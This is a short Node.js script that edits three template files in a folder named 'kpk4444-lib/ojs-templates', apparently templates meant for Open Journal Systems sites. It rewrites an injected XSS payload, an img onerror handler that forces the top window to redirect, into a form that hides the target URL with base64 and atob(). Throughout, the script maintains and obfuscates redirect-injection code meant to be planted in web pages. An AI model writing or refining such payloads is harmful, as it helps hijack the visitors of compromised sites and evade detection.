const fs = require('fs');
const files = [
  './kpk4444-lib/ojs-templates/ojs33.js',
  './kpk4444-lib/ojs-templates/ojs34.js',
  './kpk4444-lib/ojs-templates/ojs35.js'
];

files.forEach(f => {
  let c = fs.readFileSync(f, 'utf8');
  // Replace the bad escaping that causes PHP syntax error
  const badStr = '<script>window.top.location.href=\\\'https://www.google.com\\\';</script><img src=\\"x\\" onerror=\\"window.top.location.href=\\\'https://www.google.com\\\'\\">';
  
  // Actually, wait, let's just use regex to catch all of it
  c = c.replace(/<img src=\\"x\\" onerror=\\"window\.top\.location\.href='https:\/\/www\.google\.com'\\">/g, 
    "<img src=x onerror=window.top.location.href=atob('aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==')>");
    
  fs.writeFileSync(f, c);
});
console.log('Fixed files');
